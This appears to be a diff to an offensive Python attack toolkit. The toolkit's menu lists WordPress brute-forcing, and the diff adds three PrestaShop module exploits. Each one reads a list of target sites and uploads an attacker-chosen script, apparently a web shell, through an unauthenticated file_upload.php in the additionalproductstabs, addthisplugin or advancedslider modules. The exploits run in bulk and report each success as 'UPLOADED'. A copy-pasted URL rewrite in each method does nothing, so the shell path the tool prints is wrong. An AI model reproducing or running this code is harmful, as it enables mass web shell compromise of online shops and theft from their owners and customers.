@@ -43,7 +43,7 @@ def __banner__():
 	print (color.W+color.BOLD+"                                                {"+color.R+__version__+"#Dev"+color.W+"}"+color.ENDC)
 
 def __help__():
-	print (color.W+color.BOLD+"Usage   : "+color.W+sys.argv[0]+color.R+" {Module}"+color.ENDC)
+	print (color.W+color.BOLD+"Usage   : "+color.W+sys.argv[0]+color.R+" {Module}"+color.W+" -h/--help"+color.ENDC)
 	print (color.BOLD+color.Y+"Bruteforcing : "+color.ENDC)
 	print (color.W+"\t+ Wordpress Bruteforce  : wordpress_brute        | Bruteforcing WP PANEL")
 	print (color.W+"\t+ Admin Page Finder     : admin_brute            | Find Admin Page")
@@ -1051,6 +1051,57 @@ class presta_exploit:
 			else:
 				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
 	###
+	### additionalproductstabs
+	###	
+	def aps_ex(self,lists, script):
+		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Additionalproductstabs Exploit :"+color.ENDC)
+		lists = open(lists,"r")
+		lists = lists.readlines()
+		for url in lists:
+			url=url.strip()
+			url = url + "/modules/additionalproductstabs/file_upload.php"
+			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+			req=requests.post(url,files=files)
+			url=url.replace('/uploadimage.php','/slides/'+script)
+			if 'uploadshell' in req.text:
+				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+			else:
+				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+	###
+	### addthisplugin
+	###	
+	def atp_ex(self,lists, script):
+		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Addthisplugin Exploit :"+color.ENDC)
+		lists = open(lists,"r")
+		lists = lists.readlines()
+		for url in lists:
+			url=url.strip()
+			url = url + "/modules/addthisplugin/file_upload.php"
+			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+			req=requests.post(url,files=files)
+			url=url.replace('/uploadimage.php','/slides/'+script)
+			if 'uploadshell' in req.text:
+				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+			else:
+				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+	###
+	### advancedslider
+	###	
+	def as_ex(self,lists, script):
+		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Advancedslider Exploit :"+color.ENDC)
+		lists = open(lists,"r")
+		lists = lists.readlines()
+		for url in lists:
+			url=url.strip()
+			url = url + "/modules/advancedslider/file_upload.php"
+			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+			req=requests.post(url,files=files)
+			url=url.replace('/uploadimage.php','/slides/'+script)
+			if 'uploadshell' in req.text:
+				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+			else:
+				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+	###
 	### Start All Exploit
 	###
 	def __init__(self, lists, script):
@@ -1069,6 +1120,12 @@ class presta_exploit:
 		self.vtss_ex(lists, script)
 		#Start attributewizardpro Exploit
 		self.awp_ex(lists,script)
+		#Start additionalproductstabs
+		self.aps_ex(lists, script)
+		#Start addthisplugin
+		self.atp_ex(lists, script)
+		#Start advancedslider
+		self.as_ex(lists, script)
 		print (color.M+color.BOLD+"[+] "+color.BOLD+color.W+"END OF ATTACK")
 
 ####################################
@@ -1445,5 +1502,5 @@ if __name__ == '__main__':
 	except KeyboardInterrupt:
 		print (color.BOLD+color.Y+"Exiting Now !"+color.ENDC)
 		sys.exit(0)
-	except urllib2.HTTPError:
-		print (color.BOLD+color.Y+"Error, Retry Later !"+color.ENDC)
+	#except urllib2.HTTPError:
+	#	print (color.BOLD+color.Y+"Error, Retry Later !"+color.ENDC)
